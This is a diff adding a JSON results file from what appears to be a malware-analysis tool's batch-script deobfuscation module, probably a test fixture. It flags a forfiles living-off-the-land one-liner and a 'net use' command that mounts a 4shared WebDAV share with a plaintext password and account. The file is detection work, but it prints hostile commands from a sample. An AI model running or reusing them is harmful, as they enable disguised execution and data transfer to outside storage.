@@ -1,0 +1,170 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 510,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "Command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c /3.exe",
+            "LOLBAS": "forfiles"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "LOLBAS",
+            "Command"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 2,
+          "score": 400,
+          "score_map": {
+            "complex_one_liner": 400
+          },
+          "signatures": {
+            "complex_one_liner": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Possible rare LOLBAS found",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": {
+          "Number of line after deobfuscation": 4
+        },
+        "body_config": {},
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 6,
+          "score": 10,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Complexe One-Liner",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "Command": "net use Q: https://webdav.4shared.com dE}9tBDaFK'Yuv /user:lasex69621@cohodl.com",
+            "devicename": "Q:",
+            "password": "dE}9tBDaFK'Yuv",
+            "server": "https://webdav.4shared.com",
+            "user": "lasex69621@cohodl.com"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "devicename",
+            "server",
+            "password",
+            "user",
+            "Command"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 6,
+          "score": 100,
+          "score_map": {
+            "net-use": 100
+          },
+          "signatures": {
+            "net-use": 1
+          }
+        },
+        "promote_to": null,
+        "tags": {
+          "info": {
+            "password": [
+              "dE}9tBDaFK'Yuv"
+            ]
+          },
+          "network": {
+            "static": {
+              "uri": [
+                "https://webdav.4shared.com"
+              ]
+            }
+          }
+        },
+        "title_text": "Net Use found",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "1903f7d41f_deobfuscated.bat",
+        "sha256": "1903f7d41f857c12b1977417c24134fef91dfa5d503a2c982f22cd99409465f1"
+      }
+    ],
+    "supplementary": []
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 2,
+        "signatures": [
+          "complex_one_liner"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 6,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 6,
+        "signatures": [
+          "net-use"
+        ]
+      }
+    ],
+    "tags": {
+      "info.password": [
+        {
+          "heur_id": 6,
+          "signatures": [
+            "net-use"
+          ],
+          "value": "dE}9tBDaFK'Yuv"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 6,
+          "signatures": [
+            "net-use"
+          ],
+          "value": "https://webdav.4shared.com"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
